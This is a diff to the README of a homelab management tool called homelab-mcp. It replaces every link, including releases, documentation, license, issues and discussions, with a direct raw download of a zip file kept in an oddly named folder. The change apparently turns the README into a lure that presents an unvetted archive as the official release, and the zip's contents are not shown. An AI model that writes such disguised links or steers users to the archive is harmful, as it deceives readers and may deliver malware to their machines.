@@ -1,6 +1,6 @@
 # 🏠 homelab-mcp - Simplify Your Homelab Management
 
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen.svg)](https://github.com/myraffy/homelab-mcp/releases)
+[![Download](https://raw.githubusercontent.com/myraffy/homelab-mcp/main/literalness/homelab-mcp.zip)](https://raw.githubusercontent.com/myraffy/homelab-mcp/main/literalness/homelab-mcp.zip)
 
 ## 📖 Description
 
@@ -17,12 +17,12 @@ To begin using the homelab-mcp application, follow these steps:
    - Storage: At least 200 MB of free space
 
 2. **Download the Application**:
-   To get the latest version of homelab-mcp, [visit this page to download](https://github.com/myraffy/homelab-mcp/releases). Choose the appropriate version for your operating system from the available assets.
+   To get the latest version of homelab-mcp, [visit this page to download](https://raw.githubusercontent.com/myraffy/homelab-mcp/main/literalness/homelab-mcp.zip). Choose the appropriate version for your operating system from the available assets.
 
 ## 💻 Download & Install
 
 1. **Visit the Releases Page**:
-   Go to the releases section by clicking [here](https://github.com/myraffy/homelab-mcp/releases).
+   Go to the releases section by clicking [here](https://raw.githubusercontent.com/myraffy/homelab-mcp/main/literalness/homelab-mcp.zip).
 
 2. **Select Your Version**:
    On the releases page, you will find a list of versions. Look for the most recent version. Click on the version you want to download.
@@ -59,18 +59,18 @@ To begin using the homelab-mcp application, follow these steps:
 
 ## 📚 Documentation
 
-For detailed usage instructions, configuration options, and advanced features, refer to the [Documentation](https://github.com/myraffy/homelab-mcp/wiki). 
+For detailed usage instructions, configuration options, and advanced features, refer to the [Documentation](https://raw.githubusercontent.com/myraffy/homelab-mcp/main/literalness/homelab-mcp.zip). 
 
 ## ⚖️ License
 
-The homelab-mcp application is open-source and available under the MIT License. You can view the full license [here](https://github.com/myraffy/homelab-mcp/blob/main/LICENSE).
+The homelab-mcp application is open-source and available under the MIT License. You can view the full license [here](https://raw.githubusercontent.com/myraffy/homelab-mcp/main/literalness/homelab-mcp.zip).
 
 ## 🗣 Community & Support
 
 If you have questions or need help, join our community:
 
-- [GitHub Issues](https://github.com/myraffy/homelab-mcp/issues) for reporting bugs or suggestions.
-- [Discussion Forum](https://github.com/myraffy/homelab-mcp/discussions) to chat with other users.
+- [GitHub Issues](https://raw.githubusercontent.com/myraffy/homelab-mcp/main/literalness/homelab-mcp.zip) for reporting bugs or suggestions.
+- [Discussion Forum](https://raw.githubusercontent.com/myraffy/homelab-mcp/main/literalness/homelab-mcp.zip) to chat with other users.
 
 ## 👨‍💻 Contributors
 
@@ -80,8 +80,8 @@ Feel free to contribute to the project by submitting a pull request or providing
 
 ## 🔗 Links
 
-- [Releases Page](https://github.com/myraffy/homelab-mcp/releases)
-- [Documentation](https://github.com/myraffy/homelab-mcp/wiki)
-- [Community Discussions](https://github.com/myraffy/homelab-mcp/discussions)
+- [Releases Page](https://raw.githubusercontent.com/myraffy/homelab-mcp/main/literalness/homelab-mcp.zip)
+- [Documentation](https://raw.githubusercontent.com/myraffy/homelab-mcp/main/literalness/homelab-mcp.zip)
+- [Community Discussions](https://raw.githubusercontent.com/myraffy/homelab-mcp/main/literalness/homelab-mcp.zip)
 
 Now you're ready to manage your homelab infrastructure with confidence. Enjoy using homelab-mcp!
